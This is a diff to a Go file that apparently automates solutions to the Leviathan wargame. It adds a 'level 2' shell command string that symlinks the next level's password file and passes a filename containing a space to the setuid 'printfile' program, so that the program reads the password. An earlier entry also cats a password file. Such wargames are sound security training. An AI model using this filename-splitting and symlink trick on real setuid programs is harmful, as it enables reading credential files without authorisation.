@@ -28,6 +28,18 @@ var (
 			"%s\n",
 			"echo -n \"Password:\";cat /etc/leviathan_pass/leviathan2;exit\n",
 		},
+		//level 2
+		[]string{"tmpDir=\"$(mktemp -d)\";" +
+			"chmod 777 \"$tmpDir\";" +
+			"touch \"$tmpDir/a file\";" +
+			"chmod 777 \"$tmpDir/a file\";" +
+			"ln -s /etc/leviathan_pass/leviathan3 \"$tmpDir/a\";" +
+			"chmod 777 \"$tmpDir/a\";" +
+			"echo -n \"Password:\";" +
+			"./printfile \"$tmpDir/a file\";" +
+			"rm -rf \"$tmpDir\";" +
+			"exit\n",
+		},
 	}
 	passwordBytes = []byte("Password:")
 	sValueBytes   = []byte("SVALUE:")
